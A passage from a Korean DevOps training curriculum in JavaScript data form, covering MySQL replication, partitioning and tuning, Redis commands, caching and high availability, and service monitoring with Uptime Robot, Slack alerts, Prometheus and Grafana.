-- 인덱스 사용 가능`},{heading:"✅ 중급 실습",checklist:["슬로우 쿼리 로그 활성화 (2초 기준)","의도적으로 느린 쿼리 실행 후 로그 확인","EXPLAIN으로 쿼리 분석하여 type=ALL 찾기","적절한 인덱스 추가 후 성능 비교","인덱스 추가 전후 EXPLAIN 결과 비교하여 rows 차이 확인"]}]},advanced:{title:"고급: 복제, 파티셔닝, 고급 튜닝",sections:[{heading:"📚 학습 목표",content:"MySQL 복제(Replication)를 설정하고, 대용량 테이블을 파티셔닝하여 성능을 극대화한다."},{heading:"1. MySQL 복제 (Replication)",content:"마스터-슬레이브 구조로 데이터를 실시간 복사합니다.",list:["읽기 부하 분산 (슬레이브에서 SELECT)","백업 소스 (슬레이브에서 백업하여 마스터 부하 감소)","고가용성 (마스터 장애 시 슬레이브를 승격)","지리적 분산 (다른 지역에 슬레이브 배치)"]},{heading:"2. 복제 설정 (마스터)",code:`# 마스터 my.cnf 설정
[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = cms_database  # 복제할 DB

# MySQL 재시작 후 복제 사용자 생성
CREATE USER 'repl_user'@'%' IDENTIFIED BY 'strong_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl_user'@'%';
FLUSH PRIVILEGES;

# 마스터 상태 확인
SHOW MASTER STATUS;
-- File: mysql-bin.000001, Position: 154`},{heading:"3. 복제 설정 (슬레이브)",code:`# 슬레이브 my.cnf 설정
[mysqld]
server-id = 2
relay_log = /var/log/mysql/relay.log
read_only = 1  # 실수로 쓰기 방지

# 마스터 연결 설정
CHANGE MASTER TO
  MASTER_HOST='master_ip',
  MASTER_USER='repl_user',
  MASTER_PASSWORD='strong_password',
  MASTER_LOG_FILE='mysql-bin.000001',
  MASTER_LOG_POS=154;

# 복제 시작
START SLAVE;

# 복제 상태 확인
SHOW SLAVE STATUS\\G
-- Slave_IO_Running: Yes
-- Slave_SQL_Running: Yes
-- Seconds_Behind_Master: 0`},{heading:"4. 테이블 파티셔닝",content:"대용량 테이블을 논리적으로 분할하여 성능을 향상시킵니다.",code:`-- 날짜 기준 파티셔닝 (로그 테이블에 유용)
CREATE TABLE access_logs (
  id BIGINT AUTO_INCREMENT,
  user_id INT,
  accessed_at DATETIME,
  ip VARCHAR(45),
  PRIMARY KEY (id, accessed_at)
)
PARTITION BY RANGE (YEAR(accessed_at)) (
  PARTITION p2023 VALUES LESS THAN (2024),
  PARTITION p2024 VALUES LESS THAN (2025),
  PARTITION p2025 VALUES LESS THAN (2026),
  PARTITION p_future VALUES LESS THAN MAXVALUE
);

-- 파티션별 데이터 확인
SELECT
  PARTITION_NAME,
  TABLE_ROWS
FROM INFORMATION_SCHEMA.PARTITIONS
WHERE TABLE_NAME = 'access_logs';

-- 오래된 파티션 삭제 (빠른 삭제)
ALTER TABLE access_logs DROP PARTITION p2023;`},{heading:"5. 고급 성능 튜닝",code:`-- InnoDB 버퍼 풀 크기 (전체 메모리의 70-80%)
SET GLOBAL innodb_buffer_pool_size = 4G;

-- 쿼리 캐시 (MySQL 8.0에서는 제거됨, Redis로 대체 권장)
SET GLOBAL query_cache_size = 128M;

-- 연결 풀 크기
SET GLOBAL max_connections = 500;
SET GLOBAL wait_timeout = 300;  -- 유휴 연결 5분 후 종료

-- 임시 테이블 크기
SET GLOBAL tmp_table_size = 128M;
SET GLOBAL max_heap_table_size = 128M;

-- 정렬 버퍼 (복잡한 ORDER BY 성능 향상)
SET GLOBAL sort_buffer_size = 4M;`},{heading:"6. 프로파일링과 진단",code:`-- 프로파일링 활성화 (쿼리 세부 분석)
SET profiling = 1;

SELECT * FROM posts WHERE user_id = 123;

SHOW PROFILES;
-- Query_ID | Duration | Query

SHOW PROFILE FOR QUERY 1;
-- Status                | Duration
-- Opening tables        | 0.000050
-- Executing             | 0.002345
-- Sending data          | 0.001234
-- End                   | 0.000010

-- Performance Schema 활용
SELECT * FROM performance_schema.events_statements_summary_by_digest
ORDER BY SUM_TIMER_WAIT DESC
LIMIT 10;
-- 가장 느린 쿼리 10개`},{heading:"7. 실전 마이그레이션 전략",content:"무중단 마이그레이션 방법:",steps:[{label:"1단계: 새 슬레이브 추가",text:"기존 마스터에 새 슬레이브 연결"},{label:"2단계: 데이터 동기화",text:"슬레이브가 마스터를 완전히 따라잡을 때까지 대기"},{label:"3단계: 읽기 트래픽 전환",text:"애플리케이션의 SELECT 쿼리를 슬레이브로 전환"},{label:"4단계: 마스터 승격",text:"점검 시간에 슬레이브를 새 마스터로 승격"}]},{heading:"⚡ 고급 실습 과제",checklist:["마스터-슬레이브 복제 구성 (Docker Compose로 로컬 테스트)","슬레이브에서 읽기 전용 확인 (쓰기 시도 시 에러)","100만 행 이상 테이블에 파티셔닝 적용","파티션 프루닝(Partition Pruning) 효과 EXPLAIN으로 확인","Performance Schema로 가장 느린 쿼리 TOP 10 분석"]}]}}},{id:"2-3",name:"Redis 운영과 캐싱 전략",goal:"Redis를 효과적으로 활용하고 메모리를 관리할 수 있다",hours:6,keywords:["Redis management","session storage","cache strategy"],tasks:["Redis CLI로 데이터 조회","메모리 사용량 확인","세션 데이터 구조 파악"],content:{beginner:{title:"초급: Redis 기본 개념과 CLI 사용법",sections:[{heading:"📚 학습 목표",content:"Redis가 무엇인지 이해하고, Redis CLI로 데이터를 조회하고 관리할 수 있다."},{heading:"1. Redis란 무엇인가?",content:"Redis는 메모리 기반의 키-값(Key-Value) 저장소입니다. 매우 빠른 속도로 데이터를 읽고 쓸 수 있습니다.",list:["캐시: 자주 사용하는 데이터를 빠르게 조회 (DB 부하 감소)","세션 저장소: 로그인 정보, 장바구니 등","실시간 랭킹: 게임 순위, 인기 게시물","메시지 큐: 작업 대기열, 실시간 알림"]},{heading:"2. Redis vs MySQL",code:`# MySQL (디스크 기반)
- 영구 저장 (서버 재시작해도 데이터 유지)
- 복잡한 쿼리 가능 (JOIN, GROUP BY 등)
- 속도: 밀리초 단위 (1~100ms)

# Redis (메모리 기반)
- 휘발성 (기본적으로 재시작 시 삭제, 옵션으로 디스크 저장 가능)
- 단순한 키-값 조회
- 속도: 마이크로초 단위 (0.1ms 미만)

# 활용 예시
MySQL: 사용자 정보, 주문 내역 (영구 보관 필요)
Redis: 로그인 세션, 조회수 캐시 (일시적, 빠른 속도 필요)`},{heading:"3. Redis CLI 접속하기",steps:[{label:"방법 1: CapRover 대시보드",code:`Apps → Redis 앱 → ... 메뉴 → Web Terminal
redis-cli`},{label:"방법 2: Docker 명령어",code:`# Redis 컨테이너 찾기
docker ps | grep redis

# Redis CLI 실행
docker exec -it <container_id> redis-cli

# 연결 확인
PING
# 응답: PONG`}]},{heading:"4. 기본 명령어",code:`# 1. 문자열 저장/조회
SET username "john"
GET username
# 결과: "john"

# 2. 유효기간 설정 (TTL: Time To Live)
SETEX session:user123 3600 "logged_in"
# 3600초(1시간) 후 자동 삭제

# 3. 남은 시간 확인
TTL session:user123
# 결과: 3599 (초)

# 4. 키 존재 여부
EXISTS username
# 결과: 1 (존재), 0 (없음)

# 5. 키 삭제
DEL username

# 6. 모든 키 보기 (주의: 프로덕션에서는 위험!)
KEYS *

# 7. 특정 패턴의 키 검색
KEYS session:*

# 8. 데이터베이스 선택 (기본 0~15)
SELECT 1
# DB 1번으로 전환`},{heading:"5. 세션 데이터 구조 파악",content:"실제 서비스에서 Redis에 저장된 세션 데이터 확인하기:",code:`# 세션 키 패턴 찾기
KEYS sess:*
# 또는
KEYS PHPREDIS_SESSION:*

# 세션 데이터 조회
GET "sess:abc123def456"

# 결과 예시 (직렬화된 데이터)
# user_id|i:123;username|s:4:"john";cart|a:2:{i:0;s:5:"item1";i:1;s:5:"item2";}

# 세션 유효기간 확인
TTL "sess:abc123def456"
# 결과: 1800 (30분)`},{heading:"6. 메모리 사용량 확인",code:`# 서버 정보
INFO memory

# 주요 지표:
# used_memory_human: 15.23M (현재 사용 중인 메모리)
# maxmemory: 256M (최대 메모리 제한)
# used_memory_peak_human: 20.45M (최대 사용량)

# 모든 키 개수
DBSIZE
# 결과: 1523

# 특정 키의 메모리 사용량
MEMORY USAGE username
# 결과: 56 (bytes)`},{heading:"✅ 초급 실습",checklist:["Redis CLI 접속 후 PING 명령어로 연결 확인","SET/GET으로 문자열 저장/조회 테스트","SETEX로 10초 후 삭제되는 키 생성 후 TTL로 확인","KEYS 명령어로 현재 저장된 모든 키 확인","INFO memory로 메모리 사용량 확인"]}]},intermediate:{title:"중급: 캐싱 전략과 데이터 타입 활용",sections:[{heading:"📚 학습 목표",content:"다양한 Redis 데이터 타입을 활용하고, 효과적인 캐싱 전략을 수립할 수 있다."},{heading:"1. Redis 데이터 타입",content:"Redis는 문자열 외에도 다양한 자료구조를 지원합니다:",list:["String: 단순 값 (세션, 카운터)","Hash: 객체 저장 (사용자 정보)","List: 순서가 있는 목록 (최근 활동, 큐)","Set: 중복 없는 집합 (태그, 좋아요)","Sorted Set: 순위가 있는 집합 (랭킹, 리더보드)"]},{heading:"2. Hash 활용 (객체 저장)",code:`# 사용자 정보를 Hash로 저장
HSET user:123 username "john"
HSET user:123 email "john@example.com"
HSET user:123 age 30

# 여러 필드 한 번에 설정
HMSET user:456 username "alice" email "alice@example.com" age 25

# 전체 데이터 조회
HGETALL user:123
# 결과:
# 1) "username"
# 2) "john"
# 3) "email"
# 4) "john@example.com"
# 5) "age"
# 6) "30"

# 특정 필드만 조회
HGET user:123 username
# 결과: "john"

# 필드 삭제
HDEL user:123 age`},{heading:"3. List 활용 (최근 활동, 큐)",code:`# 최근 본 상품 (왼쪽에 추가)
LPUSH recent:user123 "product:456"
LPUSH recent:user123 "product:789"

# 최근 5개만 유지 (나머지 삭제)
LTRIM recent:user123 0 4

# 전체 조회
LRANGE recent:user123 0 -1
# 결과: ["product:789", "product:456"]

# 작업 큐 (오른쪽에 추가, 왼쪽에서 꺼내기)
RPUSH job:queue "task1"
RPUSH job:queue "task2"
LPOP job:queue
# 결과: "task1" (FIFO)`},{heading:"4. Sorted Set 활용 (랭킹)",code:`# 게임 점수 저장 (점수 기준 자동 정렬)
ZADD leaderboard 1500 "player1"
ZADD leaderboard 2300 "player2"
ZADD leaderboard 1800 "player3"

# 상위 3명 조회 (내림차순)
ZREVRANGE leaderboard 0 2 WITHSCORES
# 결과:
# 1) "player2"
# 2) "2300"
# 3) "player3"
# 4) "1800"
# 5) "player1"
# 6) "1500"

# 특정 플레이어 순위 (0부터 시작)
ZREVRANK leaderboard "player3"
# 결과: 1 (2등)

# 점수 증가
ZINCRBY leaderboard 100 "player1"
# player1의 점수 1600으로 증가`},{heading:"5. 캐싱 전략",content:"언제 캐시를 사용하고, 언제 갱신할까?",list:["Cache-Aside: 앱이 직접 캐시 관리 (가장 일반적)","Write-Through: DB 쓰기 시 캐시도 동시 업데이트","Write-Behind: 캐시에만 쓰고 나중에 DB 동기화","Refresh-Ahead: 만료 직전 미리 갱신"],code:`# Cache-Aside 패턴 (의사코드)
function getUser(userId) {
  // 1. 캐시에서 먼저 조회
  cached = redis.get("user:" + userId)
  if (cached) {
    return cached  // 캐시 히트
  }

  // 2. 캐시 미스 → DB 조회
  user = db.query("SELECT * FROM users WHERE id = ?", userId)

  // 3. 캐시에 저장 (1시간 유효)
  redis.setex("user:" + userId, 3600, JSON.stringify(user))

  return user
}

# 캐시 무효화 (데이터 변경 시)
function updateUser(userId, data) {
  db.query("UPDATE users SET ... WHERE id = ?", userId, data)
  redis.del("user:" + userId)  // 캐시 삭제
}`},{heading:"6. TTL 전략",content:"캐시 유효기간 설정 가이드:",list:["자주 변경되는 데이터: 짧게 (1~5분)","거의 변경 없는 데이터: 길게 (1시간~1일)","세션: 로그인 유지 시간 (30분~24시간)","임시 데이터: 매우 짧게 (10초~1분)"],code:`# 상품 정보 (1시간)
SETEX product:123 3600 "{ ... }"

# 실시간 재고 (1분)
SETEX stock:item456 60 "15"

# 일일 방문자 수 (자정까지)
SET daily:visits:20250104 1523
EXPIREAT daily:visits:20250104 1735776000  # Unix timestamp`},{heading:"✅ 중급 실습",checklist:["Hash로 사용자 객체 저장 후 HGETALL로 조회","List로 최근 활동 5개 저장 후 LTRIM으로 제한","Sorted Set으로 점수 랭킹 구현 후 상위 10명 조회","Cache-Aside 패턴으로 상품 정보 캐싱 구현","다양한 TTL 설정하여 자동 삭제 확인"]}]},advanced:{title:"고급: 메모리 최적화와 고가용성",sections:[{heading:"📚 학습 목표",content:"Redis 메모리를 효율적으로 관리하고, 클러스터와 센티널로 고가용성을 구현한다."},{heading:"1. 메모리 관리 전략",content:"메모리가 부족할 때 어떻게 처리할까?",code:`# maxmemory 설정 (redis.conf 또는 런타임)
CONFIG SET maxmemory 256mb

# 메모리 정책 (maxmemory-policy)
CONFIG SET maxmemory-policy allkeys-lru

# 정책 종류:
# noeviction: 메모리 가득 차면 쓰기 거부 (기본값)
# allkeys-lru: 모든 키 중 LRU(Least Recently Used) 삭제
# allkeys-lfu: 모든 키 중 LFU(Least Frequently Used) 삭제
# volatile-lru: TTL 있는 키 중 LRU 삭제
# volatile-ttl: TTL 짧은 키부터 삭제
# allkeys-random: 랜덤 삭제

# 현재 정책 확인
CONFIG GET maxmemory-policy`},{heading:"2. 메모리 최적화 기법",code:`# 1. 짧은 키 이름 사용
# 나쁨: user:profile:123:information
# 좋음: u:p:123

# 2. Hash 대신 String (작은 객체)
# Hash: 각 필드마다 오버헤드
# String: JSON 직렬화하여 저장
SET u:123 '{"name":"john","age":30}'

# 3. Pipeline으로 여러 명령 한 번에 전송
# 네트워크 왕복 시간(RTT) 감소
MULTI
SET key1 "value1"
SET key2 "value2"
SET key3 "value3"
EXEC

# 4. 대량 데이터 삭제는 UNLINK (비동기)
DEL bigkey  # 블로킹 (모든 작업 중단)
UNLINK bigkey  # 논블로킹 (백그라운드 삭제)

# 5. 불필요한 키 정리
redis-cli --scan --pattern "temp:*" | xargs redis-cli DEL`},{heading:"3. 영구 저장 (Persistence)",content:"Redis 재시작 시 데이터 복구 방법:",list:["RDB (Snapshot): 주기적으로 전체 데이터 덤프","AOF (Append Only File): 모든 쓰기 명령 로그 기록","RDB + AOF: 두 가지 병행 (권장)"],code:`# RDB 설정 (redis.conf)
save 900 1      # 900초 동안 1개 이상 변경 시 저장
save 300 10     # 300초 동안 10개 이상 변경 시 저장
save 60 10000   # 60초 동안 10000개 이상 변경 시 저장

# 수동 스냅샷
BGSAVE  # 백그라운드에서 저장

# AOF 활성화
CONFIG SET appendonly yes
CONFIG SET appendfsync everysec  # 1초마다 디스크 동기화

# AOF 재작성 (파일 크기 최적화)
BGREWRITEAOF`},{heading:"4. Redis Sentinel (고가용성)",content:"마스터 장애 시 자동으로 슬레이브를 승격시킵니다.",code:`# sentinel.conf 설정
sentinel monitor mymaster 127.0.0.1 6379 2
# 2개 센티널이 동의하면 failover

sentinel down-after-milliseconds mymaster 5000
# 5초 응답 없으면 다운으로 간주

sentinel failover-timeout mymaster 60000
# 페일오버 타임아웃 60초

# 센티널 실행
redis-sentinel /path/to/sentinel.conf

# 마스터 상태 확인
redis-cli -p 26379 sentinel master mymaster`},{heading:"5. Redis Cluster (분산 처리)",content:"데이터를 여러 노드에 분산하여 처리 능력을 확장합니다.",code:`# 클러스터 생성 (최소 6개 노드: 3 마스터 + 3 슬레이브)
redis-cli --cluster create \\
  127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 \\
  127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005 \\
  --cluster-replicas 1

# 클러스터 상태 확인
redis-cli -c -p 7000 cluster info

# 키 분산 원리: Hash Slot (0~16383)
# CRC16(key) % 16384 = slot 번호
# 각 마스터가 slot 범위 담당

# 클러스터 모드에서 키 조회
redis-cli -c -p 7000
SET mykey "value"
# -> Redirected to slot [14687] located at 127.0.0.1:7002`},{heading:"6. 모니터링과 진단",code:`# 실시간 명령어 모니터링 (주의: 성능 저하 가능)
MONITOR

# 슬로우 로그 (느린 명령 기록)
CONFIG SET slowlog-log-slower-than 10000  # 10ms 이상
SLOWLOG GET 10
# 가장 느린 명령 10개 표시

# 클라이언트 연결 목록
CLIENT LIST

# 통계 정보
INFO stats
# keyspace_hits: 캐시 히트
# keyspace_misses: 캐시 미스
# 히트율 = hits / (hits + misses)

# 메모리 파편화 확인
INFO memory | grep mem_fragmentation_ratio
# 1.0 ~ 1.5: 정상
# > 1.5: 메모리 파편화 발생 (재시작 필요)`},{heading:"⚡ 고급 실습 과제",checklist:["maxmemory-policy를 allkeys-lru로 설정 후 메모리 가득 채워 자동 삭제 확인","RDB + AOF 활성화하여 Redis 재시작 후 데이터 복구 테스트","Docker Compose로 Sentinel 3개 노드 구성 후 마스터 강제 종료 시 자동 페일오버 확인","SLOWLOG로 느린 명령 찾아 최적화","INFO stats로 캐시 히트율 계산 (80% 이상 목표)"]}]}}},{id:"2-4",name:"모니터링과 알림 시스템",goal:"문제를 조기에 발견하고 알림을 받을 수 있다",hours:4,keywords:["monitoring","alerting","uptime tracking"],tasks:["Uptime Robot 계정 생성 및 설정","NetData에서 실시간 그래프 확인","알림 테스트 (의도적으로 서비스 중지)"],content:{beginner:{title:"초급: Uptime 모니터링과 기본 알림 설정",sections:[{heading:"📚 학습 목표",content:"서비스가 다운되었을 때 즉시 알림을 받을 수 있도록 Uptime 모니터링을 설정한다."},{heading:"1. 모니터링이 필요한 이유",content:"서버는 언제든 다운될 수 있습니다. 사용자보다 먼저 문제를 발견해야 합니다.",list:["서버 다운: 하드웨어 장애, 네트워크 문제","애플리케이션 크래시: 메모리 부족, 버그","데이터베이스 장애: 연결 수 초과, 디스크 부족","성능 저하: CPU 100%, 느린 응답 시간"]},{heading:"2. Uptime Robot 설정",content:"무료로 50개 모니터를 5분 간격으로 체크할 수 있습니다.",steps:[{label:"Step 1",text:"계정 생성",code:`https://uptimerobot.com 접속
Sign Up (무료)`},{label:"Step 2",text:"새 모니터 추가",code:`Add New Monitor → HTTP(s) 선택
Friendly Name: My CMS
URL: https://your-site.com
Monitoring Interval: 5 minutes`},{label:"Step 3",text:"알림 설정",code:`Alert Contacts → Add Alert Contact
Email 또는 Slack, Discord, Telegram 등
알림 받을 이메일 입력 후 Verify`},{label:"Step 4",text:"모니터 활성화",code:`Create Monitor 클릭
5분마다 사이트 체크 시작`}]},{heading:"3. 모니터링 지표",content:"Uptime Robot이 확인하는 항목:",list:["HTTP 응답 코드: 200 OK인지 확인","응답 시간: 몇 초 만에 응답하는가","다운타임: 며칠 중 몇 시간 다운되었는가","Uptime 비율: 99.9% (한 달에 약 43분 다운)"],code:`# Uptime 목표
99.9% (Three Nines): 월 43분 다운 (일반 서비스)
99.99% (Four Nines): 월 4분 다운 (중요 서비스)
99.999% (Five Nines): 월 26초 다운 (금융, 의료)

# 현실적 목표
개인 프로젝트: 99% 이상 (월 7시간)
소규모 비즈니스: 99.5% 이상 (월 3.5시간)
대규모 서비스: 99.9% 이상`},{heading:"4. 알림 테스트",content:"실제로 알림이 잘 작동하는지 테스트해봅시다.",steps:[{label:"방법 1: 서비스 중지",code:`CapRover → Apps → 프론트엔드 앱 → Stop
5분 대기
→ 알림 수신 확인
→ 다시 Start`},{label:"방법 2: 방화벽 차단",code:`서버 방화벽에서 HTTP(80), HTTPS(443) 임시 차단
5분 대기
→ 알림 수신 확인
→ 방화벽 해제`},{label:"알림 예시",text:`이메일 제목: [Alert] My CMS is DOWN
내용: Your monitor 'My CMS' is currently down.
Reason: Connection timeout`}]},{heading:"5. CapRover 내장 NetData",content:"CapRover에는 NetData가 기본 내장되어 실시간 시스템 모니터링을 제공합니다.",code:`# NetData 접속
https://captain.your-server.com/#/monitoring

# 확인 가능한 지표:
- CPU 사용률 (%)
- 메모리 사용량 (MB)
- 디스크 I/O (MB/s)
- 네트워크 트래픽 (Mbps)
- 컨테이너별 리소스 사용량

# 주의할 지표:
CPU > 80%: 처리 부하 과다
메모리 > 90%: 메모리 부족 위험
디스크 > 90%: 공간 확보 필요`},{heading:"6. 일일 체크리스트",checklist:["Uptime Robot 대시보드에서 모든 서비스 Up 상태 확인","NetData에서 CPU/메모리 정상 범위 확인","응답 시간이 평소보다 느리지 않은지 확인","에러 알림이 왔다면 즉시 확인"]},{heading:"✅ 초급 실습",checklist:["Uptime Robot 계정 생성 및 메인 사이트 모니터 추가","이메일 알림 설정 및 Verify","의도적으로 서비스 중지 후 5분 내 알림 수신 확인","NetData 접속하여 실시간 CPU/메모리 그래프 확인","Uptime Robot 대시보드에서 응답 시간 그래프 확인"]}]},intermediate:{title:"중급: 다층 모니터링과 알림 채널 확장",sections:[{heading:"📚 학습 목표",content:"여러 계층(서버, 애플리케이션, 데이터베이스)을 모니터링하고, 다양한 채널로 알림을 받는다."},{heading:"1. 모니터링 계층",content:"서비스는 여러 계층으로 구성되어 있으며, 각각 모니터링이 필요합니다.",list:["인프라 계층: 서버 CPU, 메모리, 디스크","네트워크 계층: 응답 시간, 연결 상태","애플리케이션 계층: API 응답, 에러율","데이터베이스 계층: 연결 수, 슬로우 쿼리"]},{heading:"2. 여러 엔드포인트 모니터링",content:"메인 페이지뿐만 아니라 중요한 API도 모니터링합니다.",code:`# Uptime Robot 모니터 추가
1. 프론트엔드: https://your-site.com
2. API 헬스체크: https://api.your-site.com/health
3. 관리자 페이지: https://admin.your-site.com
4. 결제 API: https://api.your-site.com/payment/status

# 각 모니터마다 다른 설정:
- 프론트엔드: 5분 간격
- API: 3분 간격 (더 중요)
- 결제: 1분 간격 (가장 중요, 유료 플랜)`},{heading:"3. Slack 알림 설정",content:"팀 협업 시 Slack으로 알림받기:",steps:[{label:"Step 1",text:"Slack Webhook 생성",code:`Slack → Apps → Incoming Webhooks
Add to Slack → 채널 선택 (#alerts)
Webhook URL 복사`},{label:"Step 2",text:"Uptime Robot 연동",code:`Alert Contacts → Add Alert Contact
Type: Webhook
Webhook URL: 붙여넣기
Post Value: JSON 형식 설정`},{label:"Step 3",text:"알림 메시지 커스터마이즈",code:`{
  "text": "*[ALERT]* {{monitorFriendlyName}} is {{monitorAlertType}}",
  "attachments": [
    {
      "color": "danger",
      "fields": [
        {"title": "URL", "value": "{{monitorURL}}", "short": false},
        {"title": "Reason", "value": "{{alertDetails}}", "short": false}
      ]
    }
  ]
}`}]},{heading:"4. 커스텀 헬스체크 엔드포인트",content:"애플리케이션이 자체적으로 건강 상태를 보고하도록 합니다.",code:`// Node.js 예시
app.get('/health', async (req, res) => {
  try {
    // 1. DB 연결 확인
    await db.ping();

    // 2. Redis 연결 확인
    await redis.ping();

    // 3. 디스크 공간 확인
    const disk = await checkDiskSpace('/');
    if (disk.free < 1e9) throw new Error('Low disk space');

    // 4. 메모리 확인
    const mem = process.memoryUsage();
    if (mem.heapUsed / mem.heapTotal > 0.9) {
      throw new Error('High memory usage');
    }

    res.status(200).json({
      status: 'ok',
      timestamp: Date.now(),
      uptime: process.uptime(),
      checks: {
        database: 'ok',
        redis: 'ok',
        disk: 'ok',
        memory: 'ok'
      }
    });
  } catch (error) {
    res.status(503).json({
      status: 'error',
      error: error.message
    });
  }
});

// Uptime Robot 설정:
// URL: https://api.your-site.com/health
// Keyword: "status":"ok" (이 텍스트 포함 여부 확인)`},{heading:"5. 응답 시간 기준 알림",content:"사이트가 느려졌을 때도 알림받기:",code:`# Uptime Robot 설정
Advanced Settings → Response Time Alert
Threshold: 2000ms (2초)
Consecutive Checks: 3 (3번 연속 초과 시 알림)

# 이렇게 하면:
- 일시적 느림: 무시
- 지속적 느림: 알림`},{heading:"6. 애플리케이션 로그 모니터링",content:"특정 에러가 로그에 나타나면 알림:",code:`# 간단한 로그 모니터링 스크립트
#!/bin/bash
# check_errors.sh

ERROR_COUNT=$(docker logs backend_container --since 5m | grep -c "ERROR\\|FATAL")

if [ $ERROR_COUNT -gt 10 ]; then
  curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK/URL \\
    -H 'Content-Type: application/json' \\
    -d "{
      \\"text\\": \\"⚠️ Too many errors: $ERROR_COUNT in last 5 minutes\\"
    }"
fi

# Cron으로 5분마다 실행
*/5 * * * * /path/to/check_errors.sh`},{heading:"✅ 중급 실습",checklist:["최소 3개 엔드포인트 (프론트엔드, API, DB) 모니터링 추가","Slack 또는 Discord Webhook 연동하여 알림 수신","/health 엔드포인트 구현 후 Uptime Robot 연결","응답 시간 2초 이상 시 알림 설정","Docker 로그에서 에러 카운트하는 스크립트 작성"]}]},advanced:{title:"고급: 종합 모니터링과 SRE 지표",sections:[{heading:"📚 학습 목표",content:"Prometheus + Grafana로 종합 모니터링 대시보드를 구축하고, SLI/SLO를 정의한다."},{heading:"1. Prometheus + Grafana 스택",content:"시계열 데이터를 수집하고 시각화하는 산업 표준 도구입니다.",list:["Prometheus: 메트릭 수집 및 저장 (시계열 DB)","Grafana: 데이터 시각화 대시보드","Exporters: 각 서비스의 메트릭 노출 (Node, MySQL, Redis)","Alertmanager: 복잡한 알림 규칙 관리"]},{heading:"2. CapRover에 Prometheus 설치",code:`# CapRover Apps → One-Click Apps → Prometheus
# 설정:
App Name: prometheus
Port: 9090

# prometheus.yml 설정 (환경변수 또는 볼륨)
global:
  scrape_interval: 15s

scrape_configs:
  # Node Exporter (서버 메트릭)
  - job_name: 'node'
    static_configs:
      - targets: ['node-exporter:9100']

  # MySQL Exporter
  - job_name: 'mysql'
    static_configs:
      - targets: ['mysql-exporter:9104']

  # Redis Exporter
  - job_name: 'redis'
    static_configs:
      - targets: ['redis-exporter:9121']

  # Application (커스텀)
  - job_name: 'app'
    static_configs:
      - targets: ['backend:3000']`},{heading:"3. Grafana 대시보드 구성",steps:[{label:"Step 1",text:"Grafana 설치",code:`CapRover → One-Click Apps → Grafana
App Name: grafana
접속: https://grafana.your-server.com
기본 로그인: admin / admin`},{label:"Step 2",text:"Prometheus 데이터소스 추가",code:`Configuration → Data Sources → Add Prometheus
URL: http://srv-captain--prometheus:9090
Save & Test`},{label:"Step 3",text:"대시보드 Import",code:`Dashboards → Import
Grafana.com Dashboard:
- Node Exporter: 1860
- MySQL: 7362
- Redis: 11835
Select Prometheus Data Source → Import`}]},{heading:"4. 커스텀 메트릭 노출",content:"애플리케이션에서 비즈니스 메트릭 노출하기:",code:`// Node.js (prom-client 라이브러리)
const promClient = require('prom-client');
const register = new promClient.Registry();

// 기본 메트릭 (CPU, 메모리 등)
promClient.collectDefaultMetrics({ register });

// 커스텀 카운터
const requestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total HTTP requests',
  labelNames: ['method', 'path', 'status'],
  registers: [register]
});

// 커스텀 히스토그램 (응답 시간)
const responseTime = new promClient.Histogram({
  name: 'http_response_time_seconds',
  help: 'HTTP response time',
  labelNames: ['method', 'path'],
  registers: [register]
});

// 미들웨어
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    requestCounter.inc({
      method: req.method,
      path: req.route?.path || 'unknown',
      status: res.statusCode
    });
    responseTime.observe(
      { method: req.method, path: req.route?.path },
      (Date.now() - start) / 1000
    );
  });
  next();
});

// 메트릭 엔드포인트
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});`},{heading:"5. SLI/SLO 정의",content:"서비스 수준 목표를 설정하고 추적합니다.",code:`# SLI (Service Level Indicator): 측정 가능한 지표
1. 가용성: Uptime / Total Time
2. 지연시간: 95th percentile 응답 시간
3. 에러율: Error Requests / Total Requests

# SLO (Service Level Objective): 목표 수준
1. 가용성: 99.9% 이상 (월 43분 이하 다운)
2. 지연시간: 95%의 요청이 500ms 이내
3. 에러율: 0.1% 이하 (1000 요청 중 1개 미만)

# SLA (Service Level Agreement): 고객 약속
- SLO 미달 시 보상 (환불, 크레딧 등)

# Prometheus Query 예시
# 가용성
avg_over_time(up[30d]) * 100

# 95th percentile 응답 시간
histogram_quantile(0.95, http_response_time_seconds_bucket)

# 에러율
sum(rate(http_requests_total{status=~"5.."}[5m])) /
sum(rate(http_requests_total[5m])) * 100`},{heading:"6. 알림 규칙 (Alertmanager)",code:`# Prometheus alert.rules.yml
groups:
  - name: example
    interval: 30s
    rules:
      # 서버 다운
      - alert: InstanceDown
        expr: up == 0
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Instance {{ $labels.instance }} is down"

      # 높은 응답 시간
      - alert: HighResponseTime
        expr: histogram_quantile(0.95, http_response_time_seconds_bucket) > 2
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "95th percentile response time > 2s"

      # 높은 메모리 사용량
      - alert: HighMemoryUsage
        expr: (node_memory_MemTotal_bytes - node_memory_MemAvailable_bytes) / node_memory_MemTotal_bytes > 0.9
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Memory usage > 90%"

      # 디스크 공간 부족
      - alert: DiskSpaceLow
        expr: (node_filesystem_avail_bytes / node_filesystem_size_bytes) < 0.1
        for: 5m
        labels:
          severity: critical
        annotations:
